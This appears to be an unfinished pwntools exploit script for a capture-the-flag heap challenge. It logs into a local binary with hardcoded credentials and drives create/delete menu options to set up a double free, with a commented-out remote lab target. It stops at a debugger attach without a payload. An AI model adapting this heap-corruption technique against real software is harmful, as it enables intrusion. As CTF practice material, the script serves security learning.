from pwn import *

p = process('./pwn')
#p = remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
elf = ELF('./pwn')
context.log_level = 'debug'

p.recvuntil('username:')
p.sendline('admin')
p.recvuntil('password:')
p.sendline('frame')

def create(name,size,context):
    p.sendlineafter('>\n','1')
    p.sendafter('book name:',name)
    p.sendlineafter('description size:',str(size))
    p.sendafter('description:',context)

def delete(index):
    p.sendlineafter('>\n','2')
    p.sendlineafter('index:',str(index))

#malloc full chunk struct,control the struct
create('A',0x68,'A'*0x68)
create('A',0x90,'A'*0x90)
create('A',0x68,'A'*0x68)
delete(1)
create('A',0x60,'A'*0x60)
delete(0)
delete(2)
delete(0)
gdb.attach(p)

p.interactive()
